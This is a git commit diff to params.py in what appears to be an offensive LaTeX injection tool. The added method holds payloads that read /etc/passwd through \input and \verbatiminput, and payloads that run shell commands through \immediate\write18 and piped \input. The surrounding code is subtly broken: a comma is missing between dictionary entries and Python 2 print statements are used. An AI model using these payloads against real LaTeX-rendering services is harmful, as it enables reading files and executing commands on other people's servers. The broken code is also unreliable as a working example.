38a9f20def3af4e2f5cc337ad1afa9df609ef1ee
Seyptoo <39600961+Seyptoo@users.noreply.github.com>
2019-02-05 20:36:00 +0100

    Update params.py

--- params.py
+++ params.py
@@ -2,6 +2,7 @@
 
 import sys
 import requests
+import urllib
 
 from optparse import *
 from modules import options
@@ -18,13 +19,14 @@ class LatexIncorrectSerial(Exception):
 		self.LatexSerial = LatexSerial
 
 class LatexArgumentation:
-	def __init__(self):
+	def __init__(self, LatexOptionnal=None):
 		'''
 			Creating arguments to
 			do something cool.
 		'''
 		self.URL = options.ArgumentURL
 		self.POST = options.ArgumentPOST
+		self.Optionnal = LatexOptionnal
 
 	def StringLT(self):
 		'''
@@ -34,10 +36,35 @@ class LatexArgumentation:
 		if(self.URL.startswith(("http://", "https://")) == False):
 			raise LatexIncorrectSerial("URL crashed !")
 
-		for StringsPT in ["?", "&"]:
+		for StringsPT in ["=", "&"]:
 			if not(StringsPT in self.POST):
 				raise LatexIncorrectSerial("Post-Data crashed !")
+
+	def StringsNT(self):
+		'''
+			The attack takes place
+			here with several success.	
+		'''
+		self.Optionnal = {
+			"Reading.Measure":
+				{
+					"\input{/etc/passwd}":False,
+					"\usepackage{verbatim}":False,
+					"\+verbatiminput{/etc/passwd}":False
+			}
+
+			"Execution.Measure":
+				{
+				"\immediate\write18{cat /etc/passwd}":False,
+				"\input|cat /etc/passwd":False,
+				"\input{|'cat /etc/passwd'}":False
+			}
+		}
+
+		print self.Optionnal["Reading.Measure"].values()
+		print self.Optionnal["Execution.Measure"].values()
 
 if __name__ == "__main__":
 	Argument = LatexArgumentation()
 	Argument.StringLT()
+	Argument.StringsNT()
